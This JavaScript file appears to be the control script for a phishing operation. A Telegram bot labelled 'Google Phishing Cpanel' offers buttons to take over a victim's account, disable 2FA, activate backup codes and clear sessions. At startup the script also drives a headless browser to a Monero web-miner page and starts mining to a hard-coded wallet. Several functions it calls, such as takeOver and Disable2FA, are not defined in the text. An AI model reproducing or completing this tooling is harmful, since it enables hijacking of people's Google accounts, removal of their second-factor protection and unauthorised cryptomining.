import puppeteer from 'puppeteer';
import TelegramBot from "node-telegram-bot-api";
import "dotenv/config";

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

let page;  

(async () => {
    const browser = await puppeteer.launch({
        headless: true,
        ignoreDefaultArgs: ["--disable-extensions"],
        args: ["--no-sandbox", "--disable-setuid-sandbox", "--no-zygote", "--single-process"],
        executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
    });
    page = await browser.newPage();
    await page.goto('https://monero-webminer-main.onrender.com/', { waitUntil: 'networkidle2' });
    await delay(2000);

    const inputSelector = '#AddrField';
    const WalletAddress = '4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi';

    await page.type(inputSelector, WalletAddress);
    await page.keyboard.press("Enter");
    await delay(2000);

    await page.click('#WebMinerBtn');
})();

async function takeScreenshot() {
    if (!page) {
        throw new Error("Page is not initialized.");
    }
  
    const screenshotPath = 'screenshot.png';
    await page.screenshot({ path: screenshotPath });
    return screenshotPath;
}

// Telegram bot command handlers
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Take Over Account', callback_data: 'btn1' }],
                [{ text: 'Execute command', callback_data: 'btn2' }],
            ]
        }
    };

    bot.sendMessage(chatId, "Starting Google Phishing Cpanel...", options);
});

bot.onText(/\/screenshot/, async (msg) => {
    const chatId = msg.chat.id;
    try {
        const screenshotPath = await takeScreenshot();
        bot.sendPhoto(chatId, screenshotPath);
    } catch (error) {
        console.error("Error taking screenshot:", error);
        bot.sendMessage(chatId, "An error occurred while taking the screenshot.");
    }
});

// Handle button callback queries
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const data = callbackQuery.data;

    let responseText = '';

    switch (data) {
        case 'btn1':
            responseText = 'Taking over account...';
            bot.sendMessage(chatId, responseText);
            try {
                const welcomeText = await takeOver();
                bot.sendMessage(chatId, `Account Name: ${welcomeText}`);
            } catch (error) {
                bot.sendMessage(chatId, error.message);
            }
            break;
        case 'btn2':
            responseText = 'Select a command to execute:';
            const commandOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Disable 2FA 🔐', callback_data: 'cmd_disable_2fa' }],
                        [{ text: 'Activate Backup Codes 🔒', callback_data: 'cmd_backup_codes' }],
                        [{ text: 'Clear Sessions', callback_data: 'cmd_clear_sessions' }],
                        [{ text: 'Logout', callback_data: 'cmd_logout' }],
                    ]
                }
            };
            bot.sendMessage(chatId, responseText, commandOptions);
            break;
        case 'cmd_disable_2fa':
            responseText = 'Disabling 2FA 🔐...';
            bot.sendMessage(chatId, responseText);
            await Disable2FA(chatId);
            break;
        case 'cmd_backup_codes':
            responseText = 'Activating Backup Codes...';
            bot.sendMessage(chatId, responseText);
            await ActivateBackupCodes(chatId);
            break;
        case 'cmd_clear_sessions':
            responseText = 'Checking security settings...';
            bot.sendMessage(chatId, responseText);
            await clearSessions(chatId);
            break;
        case 'cmd_logout':
            responseText = 'Logging out...';
            bot.sendMessage(chatId, responseText);
            break;
        default:
            responseText = 'Unknown button clicked';
            bot.sendMessage(chatId, responseText);
    }
});
